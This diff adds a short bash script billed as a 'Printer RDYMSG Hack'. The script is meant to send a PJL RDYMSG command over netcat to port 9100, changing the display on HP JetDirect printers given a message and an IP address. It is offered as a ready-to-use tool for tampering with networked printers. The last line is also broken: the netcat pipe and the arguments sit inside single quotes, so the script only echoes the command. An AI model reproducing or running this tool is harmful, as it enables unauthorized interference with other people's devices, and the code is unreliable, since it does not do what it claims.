@@ -1,0 +1,8 @@
+#!/bin/bash
+if [ $# -ne 2 ]; then
+    echo "Printer RDYMSG Hack: Change the Display on HP JetDirect Printers."
+    echo "$0 <message> <ip>"
+    exit
+fi
+
+echo '@PJL RDYMSG DISPLAY=\"$1\" | netcat -q 0 $2 9100'
